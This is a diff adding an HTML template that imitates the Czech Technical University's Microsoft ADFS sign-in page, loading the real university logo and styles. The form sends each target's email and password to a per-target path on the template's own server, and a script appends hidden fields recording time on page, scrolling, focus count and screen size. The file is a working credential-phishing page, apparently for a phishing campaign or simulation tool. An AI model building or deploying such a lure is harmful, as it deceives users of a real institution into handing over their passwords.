@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="cs" dir="ltr">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<meta http-equiv="cache-control" content="no-cache,no-store">
+<title>Sign In</title>
+<link rel="stylesheet" type="text/css" href="https://logon.ms.cvut.cz/adfs/portal/css/style.css?id=EE218E4277FD9DEFDBE57E2176A7BF08CE9DDFAC040CBFAEF517299EADFD8A3A">
+<style>.illustrationClass{background-image:url(https://logon.ms.cvut.cz/adfs/portal/illustration/illustration.jpg?id=A968E85944E24FCDC94A5BED87C2CFA6AB4F36A328D588C30B0427DF9F13DC43)}</style>
+</head>
+<body dir="ltr" class="body">
+<div id="fullPage">
+    <div id="brandingWrapper" class="float">
+        <div id="branding" class="illustrationClass"></div>
+    </div>
+    <div id="contentWrapper" class="float">
+        <div id="content">
+            <div id="header">
+                <img class="logoImage" id="companyLogo"
+                    src="https://logon.ms.cvut.cz/adfs/portal/logo/logo.png?id=503E816D90FA118F2C975A443C886E6EAB3B93D2D9912631F5BA9B750ED9EB9D"
+                    alt="CTU in Prague">
+            </div>
+            <main>
+                <div id="workArea">
+                    <div id="authArea" class="groupMargin">
+                        <div id="loginArea">
+                            <div id="loginMessage" class="groupMargin">Sign in</div>
+                            <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate"
+                                onkeypress="if(event&&event.keyCode==13)Login.submitLoginRequest();"
+                                action="/t/{{ name }}/{{ token }}/submit/">
+                                <div id="error" class="fieldMargin error smallText" style="display:none;">
+                                    <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+                                </div>
+                                <div id="formsAuthenticationArea">
+                                    <div id="userNameArea">
+                                        <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                                        <input id="userNameInput" name="email" type="email"
+                                            value="{{ ct.target.email }}" tabindex="1"
+                                            class="text fullWidth" spellcheck="false"
+                                            placeholder="username@cvut.cz" autocomplete="off">
+                                    </div>
+                                    <div id="passwordArea">
+                                        <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                                        <input id="passwordInput" name="password" type="password"
+                                            tabindex="2" class="text fullWidth"
+                                            placeholder="Password" autocomplete="off">
+                                    </div>
+                                    <div id="submissionArea" class="submitMargin">
+                                        <span id="submitButton" class="submit" tabindex="3"
+                                            role="button"
+                                            onkeypress="if(event&&event.keyCode==32)Login.submitLoginRequest();"
+                                            onclick="return Login.submitLoginRequest();">Sign in</span>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    <div id="introduction" class="groupMargin">
+                        <p>Do not use your CTU email address; instead, use your CTU account login in the format:
+                            username<b>@cvut.cz</b><br>
+                            and <a href="#">CTU Password</a>.
+                            <a href="#">Can't sign in?</a>
+                        </p>
+                    </div>
+                </div>
+            </main>
+            <div id="footerPlaceholder"></div>
+        </div>
+        <footer id="footer">
+            <div id="footerLinks" class="floatReverse">
+                <div>
+                    <span id="copyright">&copy; 2018 Microsoft</span>
+                    <a id="home" class="pageLink footerLink" href="#">Computing and Information Centre</a>
+                    <a id="helpDesk" class="pageLink footerLink" href="#">ServiceDesk</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+<script type="text/javascript">
+var _t0=Date.now(),_sc=0,_fc=0;
+window.addEventListener('scroll',function(){_sc=1;},{passive:true,once:true});
+document.addEventListener('focusin',function(e){if(e.target&&e.target.tagName==='INPUT')_fc++;});
+function _addTrackingFields(){
+  var form=document.forms['loginForm'];
+  function add(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;form.appendChild(i);}
+  add('_t_time',Math.round((Date.now()-_t0)/1000));
+  add('_t_scroll',_sc);
+  add('_t_focus',_fc);
+  add('_t_screen',screen.width+'x'+screen.height);
+}
+function LoginErrors(){this.passwordEmpty='Enter your password.';}
+function Login(){}
+Login.userNameInput='userNameInput';
+Login.passwordInput='passwordInput';
+Login.submitLoginRequest=function(){
+    var pw=document.getElementById(Login.passwordInput);
+    if(!pw.value){
+        var err=document.getElementById('error');
+        var errText=document.getElementById('errorText');
+        errText.innerHTML='Enter your password.';
+        err.style.display='';
+        pw.focus();
+        return false;
+    }
+    _addTrackingFields();
+    document.forms['loginForm'].submit();
+    return false;
+};
+</script>
+</body>
+</html>
